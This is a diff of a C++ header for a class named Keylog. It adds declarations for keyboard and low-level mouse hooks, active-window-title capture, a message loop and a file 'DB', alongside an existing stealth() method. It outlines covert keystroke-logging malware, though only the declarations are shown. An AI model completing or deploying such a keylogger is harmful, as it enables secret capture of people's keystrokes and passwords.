@@ -14,6 +14,8 @@
 #include <iostream>
 #include <fstream>
 #include <Windows.h>
+#include <string>
+
 
 class __declspec(dllexport) Keylog
 {
@@ -21,24 +23,32 @@ public:
 	Keylog();
 	~Keylog();
 	int		getKey();
-	int		getMouse();
+	COORD	getMouse();
 	int		getForeground();
+	void	setKey(int);
+	void	setMouse(int, int);
 	int		stealth();
 
-	bool __stdcall installhook();
-	static LRESULT __stdcall  CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
+	bool __stdcall	installhook();
+	std::string		GetActiveWindowTitle();
+	bool			peekMsg();
+	static	LRESULT __stdcall  CALLBACK	KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
+	static	LRESULT CALLBACK	LowLevelMouseProc(int code, WPARAM wParam, LPARAM lParam);
 
 private:
 	HWND	fg;
-	int		mousePosX;
-	int		mousePosY;
+	COORD	mousePos;
 	int		keyPressed;
 
+	// Callback Keyboardproc
+	HHOOK	hkb;
+	HHOOK	hm;
 
-	// CALLBACK
-	//static HHOOK	hkb;
-	HINSTANCE		hins;
-	HHOOK hkb;
+	// Peek Message
+	MSG		msg;
+
+	// File DB
+	FILE	file_db;
 };
 
 
